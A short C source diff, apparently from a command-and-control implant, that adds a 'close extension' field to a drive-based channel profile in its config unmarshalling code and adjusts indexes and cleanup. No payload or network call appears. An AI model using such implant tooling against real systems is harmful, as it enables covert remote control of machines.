@@ -924,7 +924,7 @@ PGLOBAL_CONFIG UnmarshalConfig
 	PGLOBAL_CONFIG pResult = NULL;
 	LPVOID* UnmarshaledData = NULL;
 	PPBElement ConfigElements[16];
-	PPBElement DriveConfigElements[9];
+	PPBElement DriveConfigElements[10];
 	PPBElement HttpConfigElements[12];
 	PPBElement PivotConfigElements[3];
 	DWORD i = 0;
@@ -960,7 +960,7 @@ PGLOBAL_CONFIG UnmarshalConfig
 		DriveConfigElements[i]->Type = Bytes;
 	}
 
-	DriveConfigElements[8]->Type = Varint;
+	DriveConfigElements[9]->Type = Varint;
 	for (i = 0; i < _countof(HttpConfigElements); i++) {
 		HttpConfigElements[i] = ALLOC(sizeof(PBElement));
 		HttpConfigElements[i]->dwFieldIdx = i + 1;
@@ -1087,8 +1087,13 @@ PGLOBAL_CONFIG UnmarshalConfig
 						pDriveProfile->lpRegisterExtension = DuplicateStrA(((PBUFFER)pTemp2[7])->pBuffer, 0);
 						FreeBuffer(pTemp2[7]);
 					}
+
+					if (pTemp2[8] != NULL) {
+						pDriveProfile->lpCloseExtension = DuplicateStrA(((PBUFFER)pTemp2[8])->pBuffer, 0);
+						FreeBuffer(pTemp2[8]);
+					}
 					
-					pDriveProfile->dwPollInterval = pTemp2[8];
+					pDriveProfile->dwPollInterval = pTemp2[9];
 					pResult->DriveProfiles[i] = pDriveProfile;
 					FREE(pTemp2);
 				}
@@ -1340,6 +1345,7 @@ VOID FreeDriveProfile
 		FREE(pProfile->lpSendExtension);
 		FREE(pProfile->lpRecvExtension);
 		FREE(pProfile->lpRegisterExtension);
+		FREE(pProfile->lpCloseExtension);
 
 		FREE(pProfile);
 	}
